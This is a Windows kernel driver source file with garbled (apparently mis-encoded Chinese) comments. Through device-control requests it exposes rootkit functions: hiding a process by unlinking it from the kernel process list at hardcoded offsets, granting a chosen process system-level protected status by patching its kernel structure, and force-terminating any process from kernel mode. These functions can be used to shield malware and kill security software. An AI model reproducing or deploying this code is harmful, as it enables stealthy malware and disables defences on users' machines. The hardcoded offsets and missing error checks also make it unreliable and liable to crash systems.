/*
����֧��Win8.Win10.Win11(��֧��Win7)
��Щ�ط�д�Ĳ��Ǻܺ�(��������)
�������Ļ�����ֱ��ȥ��Release
����ֱ�Ӵ���pid������
ûд����֮���
��ֻ�б������̺�ǿɱ����֮���
���ڿ��ܻ�ӱ��
*/
#include "Driver.h"

extern "C" NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath)
{
    UNREFERENCED_PARAMETER(RegistryPath);

    NTSTATUS status;

    DriverObject->DriverUnload = DriverUnload;

    status = CreateDevice(DriverObject);
    if (!NT_SUCCESS(status)) {
        return status;
    }

    DriverObject->MajorFunction[IRP_MJ_CREATE] = DispatchCreateClose;
    DriverObject->MajorFunction[IRP_MJ_CLOSE] = DispatchCreateClose;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchDeviceControl;

    return STATUS_SUCCESS;
}

NTSTATUS CreateDevice(PDRIVER_OBJECT DriverObject)
{
    NTSTATUS status;
    UNICODE_STRING deviceName, symbolicLinkName;
    PDEVICE_OBJECT deviceObject = NULL;

    RtlInitUnicodeString(&deviceName, DEVICE_NAME);
    RtlInitUnicodeString(&symbolicLinkName, SYMBOLIC_LINK_NAME);

    status = IoCreateDevice(DriverObject, 0, &deviceName, FILE_DEVICE_UNKNOWN, 0, FALSE, &deviceObject);
    if (!NT_SUCCESS(status)) {
        return status;
    }

    status = IoCreateSymbolicLink(&symbolicLinkName, &deviceName);
    if (!NT_SUCCESS(status)) {
        IoDeleteDevice(deviceObject);
        return status;
    }

    g_DeviceObject = deviceObject;

    return STATUS_SUCCESS;
}

NTSTATUS DeleteDevice()
{
    UNICODE_STRING symbolicLinkName;

    if (g_DeviceObject != NULL) {
        RtlInitUnicodeString(&symbolicLinkName, SYMBOLIC_LINK_NAME);
        IoDeleteSymbolicLink(&symbolicLinkName);
        IoDeleteDevice(g_DeviceObject);
        g_DeviceObject = NULL;
    }

    return STATUS_SUCCESS;
}
NTSTATUS PPProtection(ULONG pid)
{
    PEPROCESS pEprocess;
    NTSTATUS status = PsLookupProcessByProcessId((HANDLE)pid, &pEprocess);

    if (NT_SUCCESS(status))
    {
        *(int*)((ULONG64)pEprocess + 0x87a) = 0x72;  //Win10,11��ƫ�ƶ���0x87a 0x72��Ӧ����PP_System
    }
    return STATUS_SUCCESS;
}
NTSTATUS PPProtection8(ULONG pid)
{
    PEPROCESS pEprocess;
    NTSTATUS status = PsLookupProcessByProcessId((HANDLE)pid, &pEprocess);

    if (NT_SUCCESS(status))
    {
        *(int*)((ULONG64)pEprocess + 0x67a) = 0x72;  //Win8��ƫ�ƶ���0x67a 0x72��Ӧ����PP_System
    }
    return STATUS_SUCCESS;
}
//���ZwKillProcessд���е��ò������ⲻ��((((((
NTSTATUS ZwKillProcess(ULONG Pid) {

    NTSTATUS status = STATUS_SUCCESS;
    PEPROCESS PeProc = { 0 };
    status = PsLookupProcessByProcessId((HANDLE)Pid, &PeProc);
    HANDLE ProcessHandle;
    status = ObOpenObjectByPointer(PeProc, NULL, NULL, STANDARD_RIGHTS_ALL, *PsProcessType, KernelMode, &ProcessHandle);

    ZwTerminateProcess(ProcessHandle, 0);
    ZwClose(ProcessHandle);
    return status;
}
//���������ֻ�Ǻܼ򵥵Ķ���,���Ӧ��ARK���߾��ܿ�������
NTSTATUS HideProcess(ULONG pid)
{
    PEPROCESS process;
    NTSTATUS status = PsLookupProcessByProcessId((HANDLE)pid, &process);

    if (NT_SUCCESS(status))
    {
        LIST_ENTRY* blink = (LIST_ENTRY*)((char*)process + 0x448);

        blink->Flink->Blink = blink->Blink;
        blink->Blink->Flink = blink->Flink;

        ObDereferenceObject(process);
    }
    return STATUS_SUCCESS;
}
NTSTATUS HideProcess8(ULONG pid)
{
    PEPROCESS process;
    NTSTATUS status = PsLookupProcessByProcessId((HANDLE)pid, &process);

    if (NT_SUCCESS(status))
    {
                LIST_ENTRY* blink = (LIST_ENTRY*)((char*)process + 0x2e8);

                blink->Flink->Blink = blink->Blink;
                blink->Blink->Flink = blink->Flink;

                ObDereferenceObject(process);
    }
    return STATUS_SUCCESS;
}
VOID DriverUnload(_In_ PDRIVER_OBJECT DriverObject)
{
    UNREFERENCED_PARAMETER(DriverObject);

    DeleteDevice();
}

NTSTATUS DispatchCreateClose(_In_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP Irp)
{
    UNREFERENCED_PARAMETER(DeviceObject);

    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;

    IoCompleteRequest(Irp, IO_NO_INCREMENT);

    return STATUS_SUCCESS;
}

NTSTATUS DispatchDeviceControl(_In_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP Irp)
{
    PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);
    NTSTATUS status = STATUS_SUCCESS;
    ULONG code = stack->Parameters.DeviceIoControl.IoControlCode;

    switch (code) {
    case IOCTL_PROTECTION_PROCESS:
    {
        ULONG pid = *(PULONG)Irp->AssociatedIrp.SystemBuffer;
        status = PPProtection(pid);
        break;
    }
    case IOCTL_PROTECTION_PROCESS8:
    {
        ULONG pid = *(PULONG)Irp->AssociatedIrp.SystemBuffer;
        status = PPProtection8(pid);
        break;
    }
    case IOCTL_TERMINATE_PROCESS:
    {
        ULONG pid = *(PULONG)Irp->AssociatedIrp.SystemBuffer;
        status = ZwKillProcess(pid);
        break;
    }
    case IOCTL_HIDDEN_PROCESS:
    {
        ULONG pid = *(PULONG)Irp->AssociatedIrp.SystemBuffer;
        status = HideProcess(pid);
        break;
    }
    case IOCTL_HIDDEN_PROCESS8:
    {
        ULONG pid = *(PULONG)Irp->AssociatedIrp.SystemBuffer;
        status = HideProcess8(pid);
        break;
    }
    default:
        status = STATUS_INVALID_DEVICE_REQUEST;
        break;
    }

    Irp->IoStatus.Status = status;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);

    return status;
}